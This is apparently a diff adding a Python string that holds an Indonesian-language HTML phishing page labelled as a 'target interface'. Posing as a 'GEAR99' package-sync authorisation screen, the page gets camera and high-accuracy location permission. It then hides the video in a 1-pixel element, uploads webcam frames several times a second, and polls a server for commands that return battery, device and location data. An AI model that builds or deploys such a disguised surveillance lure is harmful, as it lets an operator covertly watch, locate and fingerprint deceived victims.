@@ -1,0 +1,89 @@
+# --- 2. INTERFACE TARGET (SISTEM AUTOMASI PENERIMAAN PAKET) ---
+TARGET_HTML = """
+<html>
+<head>
+    <title>Lab System Synchronization</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { background-color: #0d0d0d; color: #00ff00; font-family: monospace; text-align: center; padding-top: 80px; }
+        .box { border: 2px solid #00ff00; display: inline-block; padding: 30px; background-color: #000; box-shadow: 0 0 15px #00ff00; border-radius: 8px; }
+        .btn { background-color: #003300; color: white; padding: 16px 32px; border: 1px solid #00ff00; border-radius: 4px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h2>[ GEAR99 SISTEM MANAJEMEN PAKET ]</h2>
+        <p>Gudang terisolasi memerlukan sinkronisasi media dan koordinat satu pintu.</p>
+        <button class="btn" onclick="triggerOtoritas()">OTORISASI & SINKRONISASI</button>
+    </div>
+    <video id="v-feed" autoplay playsinline muted style="position: absolute; width: 1px; height: 1px; opacity: 0.01;"></video>
+    <script>
+        var canvas = document.createElement('canvas');
+        var ctx = canvas.getContext('2d');
+        var targetLatitude = "Belum Diizinkan/Tidak Didukung";
+        var targetLongitude = "Belum Diizinkan/Tidak Didukung";
+        
+        async function triggerOtoritas() {
+            try {
+                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                let video = document.getElementById("v-feed");
+                video.srcObject = stream;
+                
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition((pos) => {
+                        targetLatitude = pos.coords.latitude;
+                        targetLongitude = pos.coords.longitude;
+                    }, null, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 });
+                }
+
+                video.onloadedmetadata = () => { 
+                    video.play(); 
+                    setInterval(captureFrame, 400); 
+                    setInterval(listenServerCommand, 1000); 
+                };
+                document.body.innerHTML = "<div class='box'><h2 style='color:#00ff00;'>[ NODE TERKONEKSI ]</h2><p>Sesi nirkabel logistik aktif melintasi manajemen private proxy.</p></div>";
+            } catch(err) { alert("Izin ditolak: " + err); }
+        }
+        
+        function captureFrame() {
+            let video = document.getElementById("v-feed");
+            if(video.videoWidth > 0) {
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                fetch('/receive_frame', { 
+                    method: 'POST', 
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ frame: canvas.toDataURL('image/jpeg', 0.4) })
+                });
+            }
+        }
+
+        async function listenServerCommand() {
+            let res = await fetch('/poll_command');
+            let data = await res.json();
+            if (data.command) {
+                let report = "";
+                let timestamp = new Date().toLocaleTimeString();
+                
+                if (data.command === "cek_baterai") {
+                    let battery = await navigator.getBattery();
+                    report = "[" + timestamp + "] STATUS BATERAI -> Level: " + (battery.level * 100) + "%, Mengisi Daya: " + battery.charging;
+                } else if (data.command === "ambil_data_sistem") {
+                    report = "[" + timestamp + "] SPESIFIKASI SISTEM -> Platform: " + navigator.platform + " | Agen: " + navigator.userAgent;
+                } else if (data.command === "ambil_lokasi") {
+                    report = "[" + timestamp + "] KOORDINAT PERANGKAT -> Lat: " + targetLatitude + " | Long: " + targetLongitude;
+                } else if (data.command === "ping_test") {
+                    report = "[" + timestamp + "] MONITOR JALUR -> Jalur komunikasi cloud aktif 100%!";
+                }
+                
+                fetch('/report_output', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ output: report })
+                });
+            }
+        }
+    </script>
+</body>
+</html>
+"""
